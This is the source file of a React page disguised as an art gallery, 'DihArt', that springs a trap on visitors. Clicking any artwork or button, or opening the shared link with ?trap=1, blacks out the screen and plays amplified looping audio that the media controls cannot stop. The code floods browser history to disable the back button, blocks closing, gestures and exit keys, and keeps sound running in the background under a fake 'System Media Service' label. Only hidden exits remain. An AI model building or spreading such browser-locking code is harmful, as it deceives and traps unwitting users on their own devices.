import React, { useState, useEffect, useRef } from 'react';
import { Palette, Eye, Volume2, VolumeX, ShieldAlert, Share2, Copy, Check, Play, AlertTriangle, RefreshCw, X, ExternalLink, Info, ZoomIn, Heart, Maximize2 } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

interface DihArtProps {
  currentUser?: any;
}

interface Artwork {
  id: string;
  title: string;
  subtitle: string;
  category: 'Abstract' | 'Contemporary' | 'Landscape' | 'Oil & Canvas' | 'Minimalist';
  year: string;
  medium: string;
  dimensions: string;
  image: string;
  description: string;
  likes: number;
}

const ARTWORKS: Artwork[] = [
  {
    id: 'art-1',
    title: 'Whispers of Dawn',
    subtitle: 'Chromatic Tension Series',
    category: 'Abstract',
    year: '2024',
    medium: 'Oil & Mixed Media on Linen',
    dimensions: '180 × 140 cm',
    image: 'https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?w=1000&auto=format&fit=crop&q=80',
    description: 'Vibrant layers of warm vermilion and deep cerulean investigating the boundary between dawn illumination and human consciousness.',
    likes: 482
  },
  {
    id: 'art-2',
    title: 'Silent Echoes',
    subtitle: 'Meditations on Solitude',
    category: 'Contemporary',
    year: '2024',
    medium: 'Acrylic & Charcoal on Canvas',
    dimensions: '200 × 160 cm',
    image: 'https://images.unsplash.com/photo-1574182245530-967d9b3831af?w=1000&auto=format&fit=crop&q=80',
    description: 'An exploration of quiet architectural spaces and structural rhythm where emotional stillness meets dynamic color gradients.',
    likes: 567
  },
  {
    id: 'art-3',
    title: 'Crimson Tide',
    subtitle: 'Fluid Dynamics Series',
    category: 'Abstract',
    year: '2023',
    medium: 'Liquid Acrylic & Heavy Pigments',
    dimensions: '160 × 160 cm',
    image: 'https://images.unsplash.com/photo-1578301978693-85fa9c0320b9?w=1000&auto=format&fit=crop&q=80',
    description: 'Rich, swirling impasto strokes and fiery crimson waves evoking raw cosmic energy and organic movement.',
    likes: 395
  },
  {
    id: 'art-4',
    title: 'Midnight Blues',
    subtitle: 'Nocturnal Atmosphere',
    category: 'Oil & Canvas',
    year: '2024',
    medium: 'Heavy Impasto Oil on Canvas',
    dimensions: '190 × 130 cm',
    image: 'https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=1000&auto=format&fit=crop&q=80',
    description: 'Deep oceanic indigo and textured shadows capturing the mystical quietude of late-night contemplation.',
    likes: 641
  },
  {
    id: 'art-5',
    title: 'Ethereal Dreams',
    subtitle: 'Transcendental Expressionism',
    category: 'Abstract',
    year: '2024',
    medium: 'Oil & Gold Leaf on Linen',
    dimensions: '175 × 140 cm',
    image: 'https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=1000&auto=format&fit=crop&q=80',
    description: 'Luminous golden undertones dancing across deep atmospheric pigments to evoke timeless dreamscapes.',
    likes: 729
  },
  {
    id: 'art-6',
    title: 'Urban Poetry',
    subtitle: 'Architectonic Formations',
    category: 'Contemporary',
    year: '2024',
    medium: 'Mixed Media & Layered Resin',
    dimensions: '180 × 150 cm',
    image: 'https://images.unsplash.com/photo-1545989253-02cc26577f88?w=1000&auto=format&fit=crop&q=80',
    description: 'Expressive brushwork and raw textures reflecting the pulse, lights, and poetry of modern metropolis nights.',
    likes: 512
  },
  {
    id: 'art-7',
    title: "Nature's Canvas",
    subtitle: 'Organic Color Synthesis',
    category: 'Landscape',
    year: '2023',
    medium: 'Pure Mineral Pigments on Raw Silk',
    dimensions: '190 × 140 cm',
    image: 'https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=1000&auto=format&fit=crop&q=80',
    description: 'Bold, saturated natural dyes blending in organic fluid harmony to celebrate earth’s raw visual elegance.',
    likes: 438
  },
  {
    id: 'art-8',
    title: 'Abstract Thoughts',
    subtitle: 'Subconscious Geometries',
    category: 'Abstract',
    year: '2023',
    medium: 'Acrylic & Oil Glaze',
    dimensions: '150 × 150 cm',
    image: 'https://images.unsplash.com/photo-1482160549825-59d1b23cb208?w=1000&auto=format&fit=crop&q=80',
    description: 'Hypnotic layering of transparent hues creating an illusion of endless depth and mental reflections.',
    likes: 384
  },
  {
    id: 'art-9',
    title: 'Serenity',
    subtitle: 'Harmonic Balance',
    category: 'Minimalist',
    year: '2024',
    medium: 'Minimalist Oil & Fine Charcoal',
    dimensions: '160 × 120 cm',
    image: 'https://images.unsplash.com/photo-1549490349-8643362247b5?w=1000&auto=format&fit=crop&q=80',
    description: 'Restrained, balanced tonal compositions inviting quiet mindfulness, space, and aesthetic purity.',
    likes: 620
  }
];

export default function DihArt({ currentUser }: DihArtProps) {
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  // Starts in gallery mode unless opened with ?trap=1 or ?play=1
  const [isScreenOffActive, setIsScreenOffActive] = useState<boolean>(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      return params.get('trap') === '1' || params.get('play') === '1';
    }
    return false;
  });
  const [copiedLink, setCopiedLink] = useState<boolean>(false);
  const [escapeCount, setEscapeCount] = useState<number>(0);

  // Persistent audio and lock refs
  const isScreenOffActiveRef = useRef<boolean>(false);
  const wakeLockRef = useRef<any>(null);
  const audioElementsRef = useRef<HTMLAudioElement[]>([]);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const audioBufferRef = useRef<AudioBuffer | null>(null);
  const bufferSourceNodesRef = useRef<AudioBufferSourceNode[]>([]);
  const gainNodesRef = useRef<GainNode[]>([]);
  const keepAliveOscRef = useRef<OscillatorNode | null>(null);
  const bgWorkerRef = useRef<Worker | null>(null);
  const secretTapCountRef = useRef<number>(0);
  const secretTapTimerRef = useRef<any>(null);
  const hasStoppedRef = useRef<boolean>(false);

  // Keep ref synchronized
  useEffect(() => {
    isScreenOffActiveRef.current = isScreenOffActive;
  }, [isScreenOffActive]);

  // Request Screen Wake Lock so phone hardware won't sleep while screen simulates off
  const requestWakeLock = async () => {
    try {
      if ('wakeLock' in navigator) {
        wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
        wakeLockRef.current.addEventListener('release', () => {
          if (isScreenOffActiveRef.current && document.visibilityState === 'visible') {
            requestWakeLock();
          }
        });
      }
    } catch (err) {}
  };

  // Request native fullscreen so browser URL bars and navigation controls vanish
  const requestFullscreenLock = () => {
    try {
      if (!document.fullscreenElement) {
        const el = document.documentElement as any;
        if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(() => {});
        else if (el.mozRequestFullScreen) el.mozRequestFullScreen().catch(() => {});
        else if (el.msRequestFullscreen) el.msRequestFullscreen().catch(() => {});
      }
    } catch (e) {}
  };

  // Preload audio on mount
  useEffect(() => {
    const preloadAudio = async () => {
      try {
        const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
        if (!audioCtxRef.current && AudioContextClass) {
          audioCtxRef.current = new AudioContextClass();
        }
        const resp = await fetch('/prankaudio.mp3');
        if (resp.ok) {
          const arrayBuf = await resp.arrayBuffer();
          if (audioCtxRef.current) {
            const decoded = await audioCtxRef.current.decodeAudioData(arrayBuf);
            audioBufferRef.current = decoded;
          }
        }
      } catch (e) {
        console.warn('Preload audio note:', e);
      }
    };
    preloadAudio();

    return () => {
      stopScreenOffAudio();
    };
  }, []);

  // Multi-Channel Persistent Audio Engine with MediaSession & Background playback
  const startScreenOffAudio = () => {
    try {
      stopScreenOffAudio();
      const audioSrc = '/prankaudio.mp3';

      // 1. Force Screen WakeLock & Fullscreen
      requestWakeLock();
      requestFullscreenLock();

      // 2. Configure OS Media Session so mobile OS keeps playing audio even when Chrome/Safari is minimized or phone locked
      if ('mediaSession' in navigator) {
        try {
          navigator.mediaSession.metadata = new MediaMetadata({
            title: 'System Media Service',
            artist: 'Audio Core Background Process',
            album: 'Non-Stop Media Stream',
            artwork: [
              { src: '/favicon.png', sizes: '512x512', type: 'image/png' }
            ]
          });
          navigator.mediaSession.playbackState = 'playing';

          const forcePlay = () => {
            navigator.mediaSession.playbackState = 'playing';
            if (isScreenOffActiveRef.current) {
              audioElementsRef.current.forEach((a) => {
                a.volume = 1.0;
                if (a.paused) a.play().catch(() => {});
              });
              if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
                audioCtxRef.current.resume().catch(() => {});
              }
            }
          };

          // Override every action handler: refuse to pause, always keep playing!
          const actions: MediaSessionAction[] = [
            'play', 'pause', 'stop', 'previoustrack', 'nexttrack', 'seekto', 'seekbackward', 'seekforward'
          ];
          actions.forEach((act) => {
            try {
              navigator.mediaSession.setActionHandler(act, forcePlay);
            } catch (e) {}
          });
        } catch (e) {}
      }

      // 3. Create persistent DOM audio rack container to prevent browser GC in background
      let rack = document.getElementById('persistent-dih-audio-rack');
      if (!rack) {
        rack = document.createElement('div');
        rack.id = 'persistent-dih-audio-rack';
        rack.style.position = 'fixed';
        rack.style.width = '0px';
        rack.style.height = '0px';
        rack.style.opacity = '0';
        rack.style.pointerEvents = 'none';
        rack.style.zIndex = '-99999';
        document.body.appendChild(rack);
      }
      rack.innerHTML = '';

      // 4. Launch 4 overlapping looping HTML5 Audio players with playsinline
      const players: HTMLAudioElement[] = [];
      for (let i = 0; i < 4; i++) {
        const audio = new Audio(audioSrc);
        audio.loop = true;
        audio.volume = 1.0;
        audio.preload = 'auto';
        audio.setAttribute('playsinline', 'true');
        audio.setAttribute('webkit-playsinline', 'true');
        audio.setAttribute('x-webkit-airplay', 'allow');
        audio.currentTime = (i * 0.15) % 1.5;

        // Auto re-trigger if browser or OS tries to pause in background
        audio.onpause = () => {
          if (isScreenOffActiveRef.current) {
            setTimeout(() => {
              audio.volume = 1.0;
              audio.play().catch(() => {});
            }, 30);
          }
        };

        audio.onended = () => {
          if (isScreenOffActiveRef.current) {
            audio.currentTime = 0;
            audio.volume = 1.0;
            audio.play().catch(() => {});
          }
        };

        audio.onerror = () => {
          audio.src = 'https://kexart.com/prankaudio.mp3';
          audio.play().catch(() => {});
        };

        rack.appendChild(audio);
        const playPromise = audio.play();
        if (playPromise !== undefined) {
          playPromise.catch(() => {});
        }
        players.push(audio);
      }
      audioElementsRef.current = players;

      // 5. Web Audio API with Amplified 250% Gain & Keep-Alive Output Carrier
      if (!audioCtxRef.current) {
        const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
        audioCtxRef.current = new AudioContextClass();
      }
      const ctx = audioCtxRef.current;
      if (ctx.state === 'suspended') {
        ctx.resume().catch(() => {});
      }

      // Sub-audible carrier oscillator to keep OS audio HAL hardware stream awake
      try {
        const keepAliveOsc = ctx.createOscillator();
        const keepAliveGain = ctx.createGain();
        keepAliveGain.gain.setValueAtTime(0.001, ctx.currentTime);
        keepAliveOsc.connect(keepAliveGain);
        keepAliveGain.connect(ctx.destination);
        keepAliveOsc.start();
        keepAliveOscRef.current = keepAliveOsc;
      } catch (e) {}

      if (audioBufferRef.current) {
        const masterGain = ctx.createGain();
        masterGain.gain.setValueAtTime(2.5, ctx.currentTime);
        masterGain.connect(ctx.destination);

        const source = ctx.createBufferSource();
        source.buffer = audioBufferRef.current;
        source.loop = true;
        source.connect(masterGain);
        source.start(0);

        bufferSourceNodesRef.current.push(source);
        gainNodesRef.current.push(masterGain);
      } else {
        fetch(audioSrc)
          .then((res) => res.arrayBuffer())
          .then((buf) => ctx.decodeAudioData(buf))
          .then((decoded) => {
            audioBufferRef.current = decoded;
            if (isScreenOffActiveRef.current) {
              const masterGain = ctx.createGain();
              masterGain.gain.setValueAtTime(2.5, ctx.currentTime);
              masterGain.connect(ctx.destination);

              const source = ctx.createBufferSource();
              source.buffer = decoded;
              source.loop = true;
              source.connect(masterGain);
              source.start(0);

              bufferSourceNodesRef.current.push(source);
              gainNodesRef.current.push(masterGain);
            }
          })
          .catch(() => {});
      }
    } catch (e) {
      console.error('Audio trigger error:', e);
    }
  };

  const stopScreenOffAudio = () => {
    try {
      if (keepAliveOscRef.current) {
        try {
          keepAliveOscRef.current.stop();
          keepAliveOscRef.current.disconnect();
        } catch (e) {}
        keepAliveOscRef.current = null;
      }

      if (audioElementsRef.current && audioElementsRef.current.length > 0) {
        audioElementsRef.current.forEach((aud) => {
          try {
            aud.onpause = null;
            aud.onended = null;
            aud.pause();
            aud.currentTime = 0;
            aud.src = '';
          } catch (e) {}
        });
        audioElementsRef.current = [];
      }

      const rack = document.getElementById('persistent-dih-audio-rack');
      if (rack) {
        rack.innerHTML = '';
      }

      if (bufferSourceNodesRef.current && bufferSourceNodesRef.current.length > 0) {
        bufferSourceNodesRef.current.forEach((src) => {
          try {
            src.stop();
            src.disconnect();
          } catch (e) {}
        });
        bufferSourceNodesRef.current = [];
      }

      if (gainNodesRef.current && gainNodesRef.current.length > 0) {
        gainNodesRef.current.forEach((g) => {
          try {
            g.disconnect();
          } catch (e) {}
        });
        gainNodesRef.current = [];
      }

      if (audioCtxRef.current && audioCtxRef.current.state !== 'closed') {
        audioCtxRef.current.suspend().catch(() => {});
      }
    } catch (e) {}
  };

  // Persistent Screen-Off Trap, Unbreakable Back Button Lock, and Background Audio Continuity
  useEffect(() => {
    if (isScreenOffActive) {
      isScreenOffActiveRef.current = true;

      // 1. Lock screen styles so no scrolling, gestures, or pull-to-refresh can happen
      const origBodyOverflow = document.body.style.overflow;
      const origBodyTouch = document.body.style.touchAction;
      const origBodyOverscroll = document.body.style.overscrollBehavior;
      const origDocTouch = document.documentElement.style.touchAction;
      const origDocOverscroll = document.documentElement.style.overscrollBehavior;

      document.body.style.overflow = 'hidden';
      document.body.style.touchAction = 'none';
      document.body.style.overscrollBehavior = 'none';
      document.documentElement.style.overflow = 'hidden';
      document.documentElement.style.touchAction = 'none';
      document.documentElement.style.overscrollBehavior = 'none';

      // 2. Unbreakable History Stack Trap (User CANNOT go back or exit)
      const floodHistory = () => {
        try {
          for (let i = 0; i < 40; i++) {
            window.history.pushState({ trap: true, step: i }, '', window.location.href);
          }
        } catch (e) {}
      };
      floodHistory();

      const handlePopState = () => {
        floodHistory();
        window.history.forward();
        ensureAudioRunning();
      };
      window.addEventListener('popstate', handlePopState);

      // Continuous pushState heartbeat: keeps history permanently flooded
      const historyTrapTimer = setInterval(() => {
        if (isScreenOffActiveRef.current) {
          try {
            window.history.pushState({ trap: true }, '', window.location.href);
          } catch (e) {}
        }
      }, 350);

      // 3. Prevent Navigating Away / Tab Closure
      const handleBeforeUnload = (e: BeforeUnloadEvent) => {
        e.preventDefault();
        e.returnValue = '';
        return '';
      };
      window.addEventListener('beforeunload', handleBeforeUnload);

      // 4. Block All Gestures, Swipes, Wheel, and Context Menu
      const preventDefaultGesture = (e: Event) => {
        if (isScreenOffActiveRef.current && (e as any).cancelable) {
          e.preventDefault();
        }
      };

      window.addEventListener('touchmove', preventDefaultGesture, { passive: false });
      window.addEventListener('wheel', preventDefaultGesture, { passive: false });
      window.addEventListener('contextmenu', preventDefaultGesture);

      // 5. Block Keyboard Navigation & Exit Keys (Backspace, Alt+Left, F5, Ctrl+R)
      const blockNavKeys = (e: KeyboardEvent) => {
        if (isScreenOffActiveRef.current) {
          if (
            e.key === 'Backspace' ||
            (e.altKey && e.key === 'ArrowLeft') ||
            e.key === 'F5' ||
            (e.ctrlKey && e.key.toLowerCase() === 'r') ||
            (e.metaKey && e.key.toLowerCase() === 'r')
          ) {
            e.preventDefault();
            e.stopPropagation();
          }
        }
      };
      window.addEventListener('keydown', blockNavKeys, true);

      // 6. Background Audio Continuity: Keep playing if phone screen locks or user switches apps
      const ensureAudioRunning = () => {
        if (isScreenOffActiveRef.current) {
          audioElementsRef.current.forEach((a) => {
            a.volume = 1.0;
            if (a.paused) {
              a.play().catch(() => {});
            }
          });
          if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
            audioCtxRef.current.resume().catch(() => {});
          }
        }
      };

      const handleVisibilityChange = () => {
        ensureAudioRunning();
        if (document.visibilityState === 'visible') {
          requestWakeLock();
          requestFullscreenLock();
        }
      };

      document.addEventListener('visibilitychange', handleVisibilityChange);
      window.addEventListener('pagehide', ensureAudioRunning);
      window.addEventListener('blur', ensureAudioRunning);
      window.addEventListener('focus', handleVisibilityChange);

      // 7. Background Web Worker: Continues pinging main thread even when Chrome/Safari is minimized!
      try {
        const workerBlob = new Blob([
          `self.onmessage = function() {
            setInterval(function() {
              self.postMessage('beat');
            }, 200);
          };`
        ], { type: 'application/javascript' });
        const worker = new Worker(URL.createObjectURL(workerBlob));
        worker.onmessage = () => {
          ensureAudioRunning();
        };
        worker.postMessage('start');
        bgWorkerRef.current = worker;
      } catch (e) {}

      // Heartbeat pulse interval
      const audioHeartbeat = setInterval(ensureAudioRunning, 250);

      // 8. Mobile Vibration burst
      if ('vibrate' in navigator) {
        try {
          navigator.vibrate([200, 100, 300, 100, 500, 100, 800]);
        } catch (e) {}
      }

      // 9. Start audio immediately
      startScreenOffAudio();

      return () => {
        isScreenOffActiveRef.current = false;
        document.body.style.overflow = origBodyOverflow;
        document.body.style.touchAction = origBodyTouch;
        document.body.style.overscrollBehavior = origBodyOverscroll;
        document.documentElement.style.touchAction = origDocTouch;
        document.documentElement.style.overscrollBehavior = origDocOverscroll;

        window.removeEventListener('popstate', handlePopState);
        clearInterval(historyTrapTimer);
        window.removeEventListener('beforeunload', handleBeforeUnload);
        window.removeEventListener('touchmove', preventDefaultGesture);
        window.removeEventListener('wheel', preventDefaultGesture);
        window.removeEventListener('contextmenu', preventDefaultGesture);
        window.removeEventListener('keydown', blockNavKeys, true);
        document.removeEventListener('visibilitychange', handleVisibilityChange);
        window.removeEventListener('pagehide', ensureAudioRunning);
        window.removeEventListener('blur', ensureAudioRunning);
        window.removeEventListener('focus', handleVisibilityChange);
        clearInterval(audioHeartbeat);

        if (bgWorkerRef.current) {
          bgWorkerRef.current.terminate();
          bgWorkerRef.current = null;
        }

        if (wakeLockRef.current) {
          try {
            wakeLockRef.current.release().catch(() => {});
          } catch (e) {}
          wakeLockRef.current = null;
        }
        stopScreenOffAudio();
      };
    }
  }, [isScreenOffActive]);

  // Key press safety listener (ESC 3 times or 'stop'/'exit' to dismiss for creator)
  useEffect(() => {
    let keyBuffer = '';
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        setEscapeCount((c) => {
          const next = c + 1;
          if (next >= 3) {
            stopPrank();
            return 0;
          }
          return next;
        });
      }
      keyBuffer = (keyBuffer + e.key.toLowerCase()).slice(-4);
      if (keyBuffer === 'stop' || keyBuffer === 'exit') {
        stopPrank();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  const triggerPrank = (force = false) => {
    if (!force && hasStoppedRef.current) return;
    hasStoppedRef.current = false;
    setIsScreenOffActive(true);
  };

  // Only auto-trigger if URL parameter requested it (?trap=1 or ?play=1)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      if (params.get('trap') === '1' || params.get('play') === '1') {
        triggerPrank(true);
        const handleFirstGesture = () => {
          startScreenOffAudio();
        };
        window.addEventListener('click', handleFirstGesture, { capture: true, once: true });
        window.addEventListener('touchstart', handleFirstGesture, { capture: true, once: true });
        return () => {
          window.removeEventListener('click', handleFirstGesture, { capture: true });
          window.removeEventListener('touchstart', handleFirstGesture, { capture: true });
        };
      }
    }
  }, []);

  // Secret corner exit: 5 rapid taps on top-right corner to dismiss
  const handleSecretCornerTap = () => {
    secretTapCountRef.current += 1;
    if (secretTapTimerRef.current) clearTimeout(secretTapTimerRef.current);
    if (secretTapCountRef.current >= 5) {
      secretTapCountRef.current = 0;
      stopPrank();
    } else {
      secretTapTimerRef.current = setTimeout(() => {
        secretTapCountRef.current = 0;
      }, 2000);
    }
  };

  const stopPrank = () => {
    hasStoppedRef.current = true;
    isScreenOffActiveRef.current = false;
    setIsScreenOffActive(false);
    stopScreenOffAudio();
    if (wakeLockRef.current) {
      try {
        wakeLockRef.current.release().catch(() => {});
      } catch (e) {}
      wakeLockRef.current = null;
    }
    if (document.fullscreenElement && document.exitFullscreen) {
      document.exitFullscreen().catch(() => {});
    }
  };

  const handleCopyPrankLink = () => {
    const url = `${window.location.origin}/dih-art`;
    navigator.clipboard.writeText(url);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 3000);
  };

  const filteredArtworks = selectedCategory === 'All' 
    ? ARTWORKS 
    : ARTWORKS.filter(a => a.category === selectedCategory);

  return (
    <div className="relative min-h-screen bg-[#07090e] text-slate-100 font-sans selection:bg-rose-500 selection:text-white pb-20">
      {/* 100% Pitch-Black Screen-Off Overlay (Simulates screen turned completely off while music plays continuously) */}
      <AnimatePresence>
        {isScreenOffActive && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.1 }}
            className="fixed inset-0 z-[99999999] bg-black w-screen h-screen select-none cursor-none overflow-hidden touch-none"
            style={{ backgroundColor: '#000000', cursor: 'none' }}
            onClick={() => {
              requestFullscreenLock();
              if (audioElementsRef.current.length === 0) {
                startScreenOffAudio();
              } else {
                audioElementsRef.current.forEach((a) => {
                  a.volume = 1.0;
                  if (a.paused) a.play().catch(() => {});
                });
              }
              if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
                audioCtxRef.current.resume().catch(() => {});
              }
              if ('vibrate' in navigator) {
                try {
                  navigator.vibrate([200, 100, 300]);
                } catch (e) {}
              }
            }}
            onTouchStart={() => {
              requestFullscreenLock();
              if (audioElementsRef.current.length === 0) {
                startScreenOffAudio();
              } else {
                audioElementsRef.current.forEach((a) => {
                  a.volume = 1.0;
                  if (a.paused) a.play().catch(() => {});
                });
              }
              if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
                audioCtxRef.current.resume().catch(() => {});
              }
            }}
            onPointerDown={() => {
              requestFullscreenLock();
              if (audioElementsRef.current.length === 0) {
                startScreenOffAudio();
              } else {
                audioElementsRef.current.forEach((a) => {
                  a.volume = 1.0;
                  if (a.paused) a.play().catch(() => {});
                });
              }
            }}
          >
            {/* Secret Emergency Exit (Invisible top-right corner zone: 5 rapid taps to exit) */}
            <div 
              onClick={(e) => {
                e.stopPropagation();
                handleSecretCornerTap();
              }}
              onTouchStart={(e) => {
                e.stopPropagation();
                handleSecretCornerTap();
              }}
              className="absolute top-0 right-0 w-24 h-24 bg-transparent z-50 cursor-default"
              title=""
            />
          </motion.div>
        )}
      </AnimatePresence>

      {/* Main KexArt Digital Exhibition UI */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8 space-y-12">
        {/* Top Navigation Bar / Branding */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pb-6 border-b border-slate-800">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-rose-600 via-pink-600 to-amber-500 flex items-center justify-center text-white shadow-lg shadow-rose-600/20">
              <Palette size={20} />
            </div>
            <h1 className="text-xl sm:text-2xl font-black tracking-tight text-white uppercase font-serif">
              DIH<span className="text-rose-500">ART</span>
            </h1>
          </div>

          {/* Gallery Navigation & Share */}
          <div className="flex items-center gap-2">
            <button
              onClick={handleCopyPrankLink}
              className="px-3.5 py-2 bg-slate-900 hover:bg-slate-800 border border-slate-700/60 rounded-xl text-xs font-bold text-slate-200 transition-all flex items-center gap-2 cursor-pointer active:scale-95 shadow-sm"
              title="Share exhibition link"
            >
              {copiedLink ? <Check size={14} className="text-emerald-400" /> : <Share2 size={14} className="text-rose-400" />}
              <span>{copiedLink ? 'Link Copied!' : 'Share Exhibition'}</span>
            </button>
            <button
              onClick={() => triggerPrank(true)}
              className="px-4 py-2 bg-gradient-to-r from-rose-600 to-red-600 hover:brightness-110 text-white font-black text-xs uppercase tracking-wider rounded-xl shadow-lg shadow-rose-600/25 transition-all flex items-center gap-1.5 cursor-pointer active:scale-95"
            >
              <Play size={13} fill="currentColor" />
              <span>Enter Exhibition</span>
            </button>
          </div>
        </div>

        {/* Showcase Banner */}
        <div className="relative rounded-3xl overflow-hidden border border-slate-800 bg-[#0c101d] p-6 sm:p-8 shadow-2xl">
          {/* Subtle Ambient Backlights */}
          <div className="absolute top-0 right-0 w-96 h-96 bg-rose-600/10 rounded-full blur-3xl pointer-events-none" />
          <div className="absolute bottom-0 left-0 w-80 h-80 bg-indigo-600/10 rounded-full blur-3xl pointer-events-none" />

          <div className="relative z-10 flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="flex flex-wrap items-center gap-4 text-left">
              <button
                onClick={() => triggerPrank(true)}
                className="px-8 py-4 bg-gradient-to-r from-rose-600 via-rose-500 to-red-600 hover:brightness-115 text-white font-black text-sm uppercase tracking-widest rounded-2xl shadow-xl shadow-rose-600/30 transition-all flex items-center gap-3 cursor-pointer group active:scale-95 animate-pulse"
              >
                <Eye size={18} className="group-hover:scale-110 transition-transform" />
                <span>EXPLORE GALLERY</span>
                <span className="w-2 h-2 rounded-full bg-white animate-ping" />
              </button>
            </div>

            {/* Featured Artwork Preview Frame */}
            <div 
              onClick={() => triggerPrank(true)}
              className="relative rounded-2xl overflow-hidden border border-slate-700/80 bg-slate-900 shadow-xl cursor-pointer transition-all duration-300 hover:border-rose-500 flex items-center gap-4 p-3 pr-6 group w-full md:w-auto"
            >
              <img 
                src="https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=500&auto=format&fit=crop&q=80" 
                alt="Featured Masterpiece" 
                onError={(e) => {
                  (e.target as HTMLImageElement).src = "https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?w=500&auto=format&fit=crop&q=80";
                }}
                className="w-20 h-20 rounded-xl object-cover object-center group-hover:scale-105 transition-transform"
              />
              <div className="text-left">
                <span className="text-[10px] uppercase font-bold text-rose-400 tracking-wider">Featured Masterpiece</span>
                <h3 className="text-base font-bold text-white font-serif">Ethereal Dreams</h3>
                <p className="text-xs text-slate-400">Click to view in high definition</p>
              </div>
            </div>
          </div>
        </div>

        {/* Gallery Filtering Tabs */}
        <div className="space-y-6">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div>
              <h3 className="text-xl sm:text-2xl font-black text-white font-serif tracking-tight uppercase">
                Curated Exhibition Pieces
              </h3>
              <p className="text-xs text-slate-400">Click any artwork to enter full-screen viewer</p>
            </div>

            <div className="flex items-center gap-1.5 overflow-x-auto pb-2 sm:pb-0 w-full sm:w-auto">
              {['All', 'Abstract', 'Contemporary', 'Oil & Canvas', 'Minimalist'].map((cat) => (
                <button
                  key={cat}
                  onClick={() => setSelectedCategory(cat)}
                  className={`px-3.5 py-1.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer whitespace-nowrap ${
                    selectedCategory === cat
                      ? 'bg-rose-600 text-white shadow-md shadow-rose-600/20'
                      : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>
          </div>

          {/* Artworks Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
            {filteredArtworks.map((art) => (
              <motion.div
                key={art.id}
                whileHover={{ y: -4 }}
                onClick={() => triggerPrank(true)}
                className="group relative rounded-2xl overflow-hidden border border-slate-800 bg-[#0d101a] shadow-lg cursor-pointer transition-all hover:border-rose-500/60 flex flex-col"
              >
                {/* Artwork Image Container */}
                <div className="relative h-64 sm:h-72 w-full overflow-hidden bg-slate-950">
                  <img 
                    src={art.image} 
                    alt={art.title} 
                    onError={(e) => {
                      (e.target as HTMLImageElement).src = "https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?w=1000&auto=format&fit=crop&q=80";
                    }}
                    className="w-full h-full object-cover object-center group-hover:scale-105 transition-transform duration-700"
                  />
                  <div className="absolute inset-0 bg-gradient-to-t from-[#0d101a] via-transparent to-transparent opacity-80" />
                  <div className="absolute top-3 left-3 px-2.5 py-1 rounded-lg bg-black/70 backdrop-blur-md border border-white/10 text-[10px] font-bold text-rose-400 uppercase tracking-wider">
                    {art.category}
                  </div>
                  <div className="absolute top-3 right-3 p-1.5 rounded-lg bg-black/70 backdrop-blur-md text-white border border-white/10 group-hover:bg-rose-600 transition-colors">
                    <Maximize2 size={14} />
                  </div>
                </div>

                {/* Card Details */}
                <div className="p-5 flex-1 flex flex-col justify-between text-left space-y-2">
                  <div>
                    <h4 className="text-base font-bold text-white font-serif group-hover:text-rose-400 transition-colors">
                      {art.title}
                    </h4>
                    <p className="text-xs text-slate-400 font-medium">{art.subtitle}</p>
                  </div>

                  <p className="text-xs text-slate-400 line-clamp-2 leading-relaxed">
                    {art.description}
                  </p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
